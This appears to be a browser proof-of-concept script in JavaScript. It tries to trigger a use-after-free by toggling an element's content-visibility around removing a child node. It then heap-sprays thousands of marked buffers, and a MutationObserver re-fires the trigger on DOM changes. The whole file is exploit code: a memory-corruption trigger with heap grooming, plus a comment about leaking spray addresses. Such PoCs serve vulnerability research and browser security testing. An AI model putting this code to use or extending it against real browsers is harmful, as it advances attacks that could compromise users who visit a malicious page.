import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    arr[0] = 0x41; // Mark the spray for identification
    spray.push(arr);
  }
  debug_log(`Heap spray completed: ${spray.length} arrays`);
  return spray;
}

export function triggerUAF() {
  debug_log("Setting content-visibility: hidden");
  container.style.contentVisibility = "hidden";
  debug_log("Removing child div...");
  child.remove();
  setTimeout(() => {
    debug_log("Restoring content-visibility: auto");
    container.style.contentVisibility = "auto";
    let spray = heapSpray();
    debug_log("UAF triggered, check for crash or memory corruption.");
    // Optionally, log the first few spray array addresses (if you can leak them)
    // debug_log(`Spray[0]: ${spray[0]}`);
  }, 0);
}

const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, attempting UAF...");
  triggerUAF();
});

observer.observe(container, { childList: true, subtree: true });
